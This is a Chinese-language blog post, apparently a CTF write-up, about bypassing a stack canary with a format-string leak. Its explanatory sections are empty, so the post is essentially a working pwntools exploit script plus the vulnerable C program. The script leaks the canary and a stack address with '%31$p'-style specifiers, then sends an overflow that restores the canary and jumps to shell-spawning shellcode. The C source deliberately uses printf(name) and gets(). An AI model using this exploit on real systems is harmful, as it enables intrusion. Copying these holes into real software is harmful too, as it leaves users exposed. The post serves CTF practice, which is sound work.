---
layout:     post
title:      fmt_bypass_canary
subtitle:   解题思路
date:       2018-07-05
author:     Mao
header-img: img/home-bg-geek.jpg
catalog: true
tags:
    - PWN
    - 栈溢出
    - leak_info
---



## 所需环境

环境要求

> ubuntu 16.04 64bit
>
> python 2.7



所需工具

> pwntools
>
> gdb-peda
>
> 32位 ida





## 分析过程





## 解题思路

思路



exp.py

```python
#!/usr/bin/env python

from pwn import *

remote_is = 1

if remote_is == 1 :
    sh = remote('127.0.0.1', 4444)
else:
    sh = process('./pwn1')

shellcode = asm(shellcraft.sh())

sh.recvuntil('please enter your name:')
sh.sendline('%p.%31$p.%34$p.%p')#trace printf
#sh.recv()
leak_data = sh.recv()
address = leak_data.split('.')
print address

canary_addr = address[1]
print 'canary_addr : %s' % canary_addr

stack_addr = address[2]
print 'stack_addr : %s' % stack_addr

shellcode_addr = int(stack_addr,16)-0x88#print_str address

sh.sendline('a'*100 + p32(int(canary_addr,16)) + 'b'*12 + p32(shellcode_addr) + shellcode)

sh.interactive()
```



fmt_bypass_canary.c

```c
#include <stdio.h>

#include <unistd.h>


void get_message(char *name);

int volatile main()
{
    setbuf(stdout, 0);

    char name[100];

    printf("please enter your name:");

    gets(name);
    printf("Welcome to participate the 429 ctf!\n");

    get_message(name);

    printf("thank you!\n");

    return 0;
}

void get_message(char * name)
{
    char message[100];
    printf(name);
    printf(", can you leave me some messages:");
    gets(message);
}
```



## 总结



